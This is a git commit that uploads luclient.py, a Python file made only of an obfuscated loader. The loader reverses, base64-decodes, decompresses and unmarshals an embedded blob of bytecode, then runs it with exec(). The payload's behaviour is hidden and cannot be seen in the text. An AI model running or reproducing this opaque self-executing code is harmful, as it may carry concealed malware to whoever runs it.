f5d05e62d6e14337365827d3252680869a7f7f5f
qwweseg <166302052+qwweseg@users.noreply.github.com>
2024-06-01 13:05:32 +0300

    Add files via upload

---
+++ luclient.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Sat May 18 19:47:19 2024
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vZecj+Q/tF/7yB3u1ut6+GFaM3/iIEHYO4G1DveuGc5X7e4dy/OmmDgn4+CGciX8z+jax7wrA4/6wdWd6jV/k1Hq+L/+c9vW8wIzl94s4d4NAKH9/aU4Jz/sJVqpRO+Whn4MpFHTfzD8IV6XK7bCU0K8vQwgQXBphx10CIEuUmgCjjpEVUMMksSkARZIdMiLAhOArr+Gia9Sxq5CVL0s129qTnznT70E23FI2ykIeX4jOVgc4Q/J1ia7NmZdZjZpqI2easEpydCiEzqhXg2nUGdMEKJUqhkpClIBPhMixzMw62pda32tI7JRQsvN6ChojqNdqIA0CKv3DTZsy9bHzWcbZNud+L7v3F02YzGfdI7rCczK+MiPEoGJm2TcaPsllvf2SUaU0XIjb/0BZfOGJNif/+ZNHPjGDVTGCJ2niMjEnz6oYbGY9kUcZUz1spMf0BdnM8cFND/OYZvGgu+ZT97cW2QU0U3/7eGzrb//KV/Fr0pGyNnWJrC2a+Is7o+7fFg3N3frZWzj5MA/N/p0C5NrFxszg+5Mn6+TmDlTdb5OTlGrp2pADAEgLdY/VgGuguaBFn3WOjSZGWcOZh8j8wVLMe1S1pYamFLSZlhzwyVihSzOgjgGfmAj0gbDzwjfzvDzzvzz6U7sO58TC5VgvNA/L7AQT+B1iKo/SjHPe8wQaqXT2emc9bcyMOZYUsbRIVFtbBA/UQiHrEENLeRolhlIqodk6nks3dmfYE0Er1EUdxJe'))
